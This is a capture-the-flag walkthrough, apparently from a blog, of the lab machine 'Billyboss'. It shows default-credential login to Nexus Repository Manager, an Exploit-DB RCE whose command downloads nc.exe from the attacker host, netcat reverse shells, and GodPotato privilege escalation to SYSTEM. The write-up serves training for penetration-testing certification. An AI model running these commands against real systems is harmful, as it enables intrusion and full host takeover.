---
title: Billyboss
categories:
  - PG
tags:
  - boot2root
  - OSCP-Prep
---

# Machine Information

- Machine Name: Billyboss
- Machine Difficulty: Intermediate

## Information Gathering

Classic nmap time

```bash
Nmap scan report for 192.168.206.61
Host is up, received user-set (0.023s latency).
Scanned at 2024-10-07 11:25:57 +08 for 589s   
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 125 Microsoft ftpd
| ftp-syst:                                           
|_  SYST: Windows_NT                         
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
|_http-title: BaGet
|_http-favicon: Unknown favicon MD5: 8D9ADDAFA993A4318E476ED8EB0C8061
|_http-server-header: Microsoft-IIS/10.0
| http-methods:          
|_  Supported Methods: GET HEAD
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
5040/tcp  open  unknown       syn-ack ttl 125
7680/tcp  open  pando-pub?    syn-ack ttl 125                                                                         
8081/tcp  open  http          syn-ack ttl 125 Jetty 9.4.18.v20190429                         
| http-methods: 
|_  Supported Methods: GET HEAD 
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
|_http-server-header: Nexus/3.21.0-05 (OSS)
|_http-favicon: Unknown favicon MD5: 9A008BECDE9C5F250EDAD4F00E567721
|_http-title: Nexus Repository Manager
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```

There's a few web port opened. Lets focus on those first. 

## Port 80

According to the Nmap result, it is "BaGet" server. 

![](/assets/img/posts/2024-10-07-Billyboss/2024-10-07-Billyboss-11-38-22.png)

After exploring and googling for exploit, nothing interesting was found. I then decided to move on to another port first.

## Port 8081

According to the Nmap result, the website header is "Nexus/3.21.0-05 (OSS)"

![](/assets/img/posts/2024-10-07-Billyboss/2024-10-07-Billyboss-11-51-34.png)

After researching for the version number, I found a [exploit](https://www.exploit-db.com/exploits/49385) which looks promising. After understanding it, Ill need to have a correct credential. Its time to look into common / weak credentials.

```bash
cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.csv | grep Nexus
Sonatype Nexus Repository Manager,admin,admin123,https://help.sonatype.com/repomanager2/maven-and-other-build-tools/sbt
Sonatype Nexus Repository Manager,nexus,nexus,
```

I used the default password list which could be found [here](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Default-Credentials/default-passwords.csv). The credential `nexus:nexus` works and I could use it to login. Since the credentials was found, it's time to run the exploit can test if I could perform RCE. Make sure to change the needed infomation accordingly.

```py
URL='http://192.168.206.61:8081'
CMD='cmd.exe /c curl 192.168.45.191:8000/windows/nc.exe -O'
USERNAME='nexus'
PASSWORD='nexus'
```

```bash
python 49385.py                                                              
Logging in
Logged in successfully
Command executed
```

After executing the exploit, its time to verify. Since the command that I put is downloading a file, lets see if it actually works.

```bash
uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.206.61 - - [07/Oct/2024 12:08:35] "GET /windows/nc.exe HTTP/1.1" 200 -
```

OK, it seems to be working. Now I'll just need to get a reverse shell by modifying the `CMD`  to `cmd /c nc.exe 192.168.45.191 1234 -e cmd`.

```bash
rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.206.61] 50162
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\nathan\Nexus\nexus-3.21.0-05>whoami
whoami
billyboss\nathan
```

Now that I have a shell but I'm not administrator user, it's time to perform privilege escalation.

## Privilege Escalation

Its always good to run `winpeas` and go through the result. 

```bash
C:\Users\nathan\Nexus\nexus-3.21.0-05>whoami /all
whoami /all

USER INFORMATION
----------------

User Name        SID                                           
================ ==============================================
billyboss\nathan S-1-5-21-2389609380-2620298947-1153829925-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

ERROR: Unable to get user claims information.
```

Based on the result provided from `whoami /all`, I noticed that I have `SeImpersonatePrivilege` privilege which means I could use potato attacks to get Administrator account. I'll be using GodPotato to get NT Authority System in this case.

```bash
C:\Users\nathan\Nexus\nexus-3.21.0-05>.\god4.exe -cmd whoami
.\god4.exe -cmd whoami
[*] CombaseModule: 0x140710219218944
[*] DispatchTable: 0x140710221561440
[*] UseProtseqFunction: 0x140710220929472
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\2f7410d2-67bf-4344-a571-1d9caf7c8572\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00007402-0ec8-ffff-57e0-97d9e48fb2bb
[*] DCOM obj OXID: 0xb5d74ed44dd8d430
[*] DCOM obj OID: 0x1f2344f159d1612c
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 832 Token:0x768  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4320
```

With that, I could just get reverse shell using this potato attack gain full access.

```bash
C:\Users\nathan\Nexus\nexus-3.21.0-05>.\god4.exe -cmd "C:\Users\nathan\Nexus\nexus-3.21.0-05\nc.exe 192.168.45.191 1235 -e cmd"
.\god4.exe -cmd "C:\Users\nathan\Nexus\nexus-3.21.0-05\nc.exe 192.168.45.191 1235 -e cmd"
[*] CombaseModule: 0x140710219218944
[*] DispatchTable: 0x140710221561440
[*] UseProtseqFunction: 0x140710220929472
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\73c786e4-6a81-4eba-84d1-e68ca9f9bf83\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00002002-01b0-ffff-3070-b950caf4b879
[*] DCOM obj OXID: 0x2ca5116b9eb7d06c
[*] DCOM obj OID: 0x18963c26ce32ecc0
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 832 Token:0x768  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3544
```

```bash
rlwrap nc -nvlp 1235
listening on [any] 1235 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.206.61] 50199
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

And that's how I get the administrator shell ~

## Things that I learned from this machine

- usually web ports are the to go exploit
- LOOK INTO THE SECLISTS DEFAULT PASSWORD FILE AND TRY THAT
 